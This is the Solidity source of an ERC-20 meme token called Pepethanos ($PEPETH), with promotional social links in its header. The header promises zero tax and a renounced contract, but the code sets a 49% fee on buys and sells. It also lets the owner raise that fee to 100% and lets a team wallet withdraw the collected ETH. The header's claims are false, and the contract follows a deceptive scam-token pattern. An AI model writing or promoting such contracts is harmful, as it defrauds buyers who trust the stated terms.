/**
Pepethanos ($PEPETH) - a token of untold power, forged in the cosmic fires of a zero-tax realm, sustained by the relentless force of sentinel. Its contract, renounced, and its liquidity, vanquished in the flames of eternity?.

https://twitter.com/pepe_thanos
https://t.me/PepethanosPortal

SPDX-License-Identifier: MIT                                                    
**/
pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IDEXFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Pepethanos is IERC20, Ownable {
    string constant _name = "Pepethanos";
    string constant _symbol = "PEPETH";
    uint8 constant _decimals = 18;
    uint256 _totalSupply = 10_000_000 * (10 ** _decimals);
    uint256 public moneyHolderCap = (_totalSupply * 2) / 100;
    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) isFeeFree;
    mapping(address => bool) liqAuthor;
    uint256 feeDenominator = 10000;
    uint256 collectiveFee = 4900;
    address DEAD_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    address ZERO_ADDRESS = 0x0000000000000000000000000000000000000000;

    IDEXRouter public router;
    address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    mapping(address => bool) liquidityReserves;

    address public pair;

    uint256 public runAt;
    bool public swapEnbl = false;
    bool lfg = false;

    bool swap;
    modifier swapping() {
        swap = true;
        _;
        swap = false;
    }

    modifier balanceCapacityLimit(address recipient, uint256 amount) {
        if (
            recipient != pair && !liqAuthor[recipient] && !isFeeFree[recipient]
        ) {
            require(
                _balances[recipient] + amount <= moneyHolderCap,
                "Exceeds maximum wallet size"
            );
        }
        _;
    }

    address squadWallet;
    modifier onlyTeam() {
        require(_msgSender() == squadWallet, "Caller is not a squad member");
        _;
    }

    event FundsDistributed(uint256 teamFee);

    constructor() {
        router = IDEXRouter(routerAddress);
        pair = IDEXFactory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        liquidityReserves[pair] = true;
        _allowances[owner()][routerAddress] = type(uint256).max;
        _allowances[address(this)][routerAddress] = type(uint256).max;

        isFeeFree[owner()] = true;
        isFeeFree[address(this)] = true;
        liqAuthor[owner()] = true;

        _balances[owner()] = _totalSupply;

        emit Transfer(address(0), owner(), _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    function name() external pure returns (string memory) {
        return _name;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(
        address holder,
        address spender
    ) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function setSquadWallet(address _team) external onlyOwner {
        squadWallet = _team;
    }

    function setFee(uint256 newFee) external onlyOwner {
        require(newFee >= 0 && newFee <= feeDenominator, "Wrong tax fee");
        collectiveFee = newFee;
    }

    function cashOutFee(uint256 amount) external onlyTeam {
        uint256 amountETH = address(this).balance;
        payable(squadWallet).transfer((amountETH * amount) / 100);
    }

    function initiateTrading() external onlyOwner {
        require(!lfg);
        lfg = true;
        runAt = block.number;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal balanceCapacityLimit(recipient, amount) returns (bool) {
        require(sender != address(0), "ERC20: transfer from 0x0");
        require(recipient != address(0), "ERC20: transfer to 0x0");
        require(amount > 0, "Amount must be higer than zero");
        require(_balances[sender] >= amount, "Insufficient balance");

        if (!released() && liquidityReserves[recipient]) {
            require(liqAuthor[sender], "Liquidity not added yet.");
            start();
        }

        if (!lfg) {
            require(
                liqAuthor[sender] || liqAuthor[recipient],
                "Trading not open yet."
            );
        }

        if (swap) {
            return _basicTransfer(sender, recipient, amount);
        }

        _balances[sender] = _balances[sender] - amount;

        uint256 amountReceived = feeExcluded(sender)
            ? takeFee(recipient, amount)
            : amount;

        if (mustSwapBack(recipient)) {
            if (amount > 0) swapBack();
        }

        _balances[recipient] = _balances[recipient] + amountReceived;

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function released() internal view returns (bool) {
        return runAt != 0;
    }

    function start() internal {
        runAt = block.number;
        swapEnbl = true;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function feeExcluded(address sender) internal view returns (bool) {
        return !isFeeFree[sender];
    }

    function buyOrSaleOperation(
        address sender,
        address recipient
    ) internal view returns (bool) {
        return sender == pair || recipient == pair;
    }

    function takeFee(
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        if (!buyOrSaleOperation(msg.sender, recipient)) {
            return amount;
        }

        uint256 feeAmount = (amount * collectiveFee) / feeDenominator;
        _balances[address(this)] += feeAmount;

        return amount - feeAmount;
    }

    function mustSwapBack(address recipient) internal view returns (bool) {
        return
            !liquidityReserves[msg.sender] &&
            !swap &&
            swapEnbl &&
            liquidityReserves[recipient];
    }

    function swapBack() internal swapping {
        if (_balances[address(this)] > 0) {
            uint256 amountToSwap = _balances[address(this)];

            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = router.WETH();

            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                amountToSwap,
                0,
                path,
                address(this),
                block.timestamp
            );

            emit FundsDistributed(amountToSwap);
        }
    }

    function addLiquidityFunder(address _liquidityFunder) external onlyOwner {
        liqAuthor[_liquidityFunder] = true;
        excludeFromTaxes(_liquidityFunder);
    }

    function excludeFromTaxes(address account) internal {
        isFeeFree[account] = true;
    }

    function modifySettings(bool _enabled) external onlyOwner {
        swapEnbl = _enabled;
    }

    function getCurrentSupply() public view returns (uint256) {
        return
            _totalSupply - (balanceOf(DEAD_ADDRESS) + balanceOf(ZERO_ADDRESS));
    }
}